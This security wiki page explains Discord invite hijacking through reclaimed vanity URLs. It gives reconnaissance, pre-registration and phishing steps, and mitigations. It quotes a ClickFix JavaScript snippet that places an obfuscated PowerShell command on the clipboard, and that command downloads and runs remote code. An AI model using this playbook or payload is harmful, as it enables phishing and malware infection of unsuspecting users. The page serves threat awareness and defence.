# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord invite hijacking abuses the reuse rules for custom vanity links: an expired temporary invite code, or a deleted permanent code made only of lowercase letters and digits, may be registered as a vanity link on a Level 3 boosted server. A custom vanity link can likewise become available when its original server loses its Level 3 Boost; for an uppercase temporary invite, an attacker can pre-register the lowercase vanity form while the regular invite remains active, but redirection starts only after that invite expires.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

The observed risk differs by invite type:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | After expiration, the code becomes available and can be re-registered as a vanity URL by a boosted server. |
| Permanent Invite Link | ⚠️          | If deleted and consisting only of lowercase letters and digits, the code may become available again.        |
| Custom Vanity Link    | ✅          | If the original server loses its Level 3 Boost, its vanity invite becomes available for new registration.    |

## Exploitation Steps

1. Reconnaissance
   - Monitor public sources (forums, social media, Telegram channels) for invite links matching the pattern `discord.gg/{code}` or `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
   - Collect invite codes of interest (temporary or vanity).<sup>[[1]](#references)</sup>
2. Pre-registration
   - Create or use an existing Discord server with Level 3 Boost privileges.<sup>[[1]](#references)[[2]](#references)</sup>
   - In **Server Settings → Vanity URL**, attempt to assign the target invite code. If accepted, the code is reserved by the malicious server.<sup>[[1]](#references)</sup>
3. Hijack Activation
   - For temporary invites, wait until the original invite expires (or manually delete it if you control the source).<sup>[[1]](#references)</sup>
   - For uppercase-containing codes, the lowercase variant can be claimed immediately, though redirection only activates after expiration.<sup>[[1]](#references)</sup>
4. Silent Redirection
   - Users visiting the old link are seamlessly sent to the attacker-controlled server once the hijack is active.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Restrict server channels so only a **#verify** channel is visible.<sup>[[1]](#references)</sup>
2. Deploy a bot (e.g., **Safeguard#0786**) to prompt newcomers to verify via OAuth2.<sup>[[1]](#references)</sup>
3. Bot redirects users to a phishing site (e.g., `captchaguard.me`) under the guise of a CAPTCHA or verification step.<sup>[[1]](#references)</sup>
4. Implement the **ClickFix** UX trick:<sup>[[1]](#references)</sup>
   - Display a broken CAPTCHA message.
   - Guide users to open the **Win+R** dialog, paste a preloaded PowerShell command, and press Enter.

### ClickFix Clipboard Injection Example

The campaign used JavaScript to copy a malicious PowerShell command to the clipboard:<sup>[[1]](#references)</sup>

```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
            `$u=($r[-1..-($r.Length)]-join '');` +
            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
            `iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```

This approach avoids direct file downloads and leverages familiar UI elements to lower user suspicion.<sup>[[1]](#references)</sup>

## Mitigations

- Prefer permanent invite links and ensure the code contains at least one uppercase letter; deleted permanent codes containing uppercase letters cannot be reused as vanity links.<sup>[[1]](#references)</sup>
- Regularly rotate invite codes and revoke old links.
- Monitor Discord server boost status and vanity URL claims.<sup>[[1]](#references)[[2]](#references)</sup>
- Educate users to verify server authenticity and avoid executing clipboard-pasted commands.

## References

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
